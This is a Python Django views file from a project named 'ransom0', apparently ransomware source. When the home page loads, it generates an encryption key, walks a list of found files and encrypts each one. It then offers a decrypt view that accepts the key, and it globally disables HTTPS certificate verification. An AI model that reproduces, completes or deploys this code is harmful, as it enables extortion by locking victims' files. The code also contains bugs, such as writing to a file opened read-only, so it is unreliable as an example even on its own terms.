from django.shortcuts import render
from datetime import datetime
import os
import requests

from os import name, path 
from random import randint

from cryptography.fernet import Fernet


from ransom0 import start
from ransom0.forms import ClientForm

from pyngrok import ngrok, conf
import ssl


try:
    _create_unverified_https_context = ssl._create_unverified_context
except AttributeError:
    # Legacy Python that doesn't verify HTTPS certificates by default
    pass
else:
    # Handle target environment that doesn't support HTTPS verification
    ssl._create_default_https_context = _create_unverified_https_context




#global variables

key = Fernet.generate_key()
digits = randint(1111,9999) 




ransom0 = start.Ransom0(key,digits)

def start_ransom():
    try:
        ransom0.FindFiles()
        filepath = 'logs/path.txt'
        with open(filepath) as fp:
            
            for line in fp:
                filename = line.strip()
                try:
                    if os.path.isfile(filename):
                        ransom0.Encrypt(filename)
                except Exception:
                    print('persmission denied')
        
            
        fp.close()
        print('decrypted : false')
    except FileNotFoundError:
        os.mkdir("logs")   
        f = open("logs/digits.txt","w")
        f.write(str(ransom0.digits))
        f.close()
        start_ransom() 




def home(request):
    now = datetime.now()
    date = now.strftime("%d/%m/%Y %H:%M:%S")
    
    context = {
        'digits': ransom0.digits,
        'date': date}
    
    
    if path.exists('logs') is True:
        f = open('logs/digits.txt','r')
        digits = f.read()
        f.close()
    else:
            
        os.mkdir('logs')
        f= open('logs/digits.txt', 'w')
        digits = ransom0.digits
        f.write(str(digits))
        f.close()
        start_ransom()
    return render(request,'ransom0/home.html',context)

def decrypt_files(request):
    
    
    
    
    def decrypt(filename):
        key = request.body.decode('utf-8')
            
        f = Fernet(key)
        with open(filename,"rb") as file:
            encrypted_data = file.read()
        try:
            
            decrypted_data = f.decrypt(encrypted_data)
        except:
            print('Wrong KEY')
        with open(filename,"rb") as file:
            file.write(decrypted_data)
    
    def decrypt_all():
        with open('logs/path.txt') as fp:
            line = fp.readline()
            while line:
                filename = line.strip()
                try:
                    decrypt(filename)
                    decrypted = 'true'
                except PermissionError:
                    print('permission denied')
                line = fp.readline()
            
        
    
    form = ClientForm()
    
    if request.POST:
        form = ClientForm(request.POST)
        if form.is_valid():
            print('Key is Valid')
                
            print('FORM : ',form)
            client = form.save()
            decrypt_all()
            
            
    
   
    context = {
        'decrypted': 'true'
    }
    return render(request,'ransom0/decrypt.html',context)
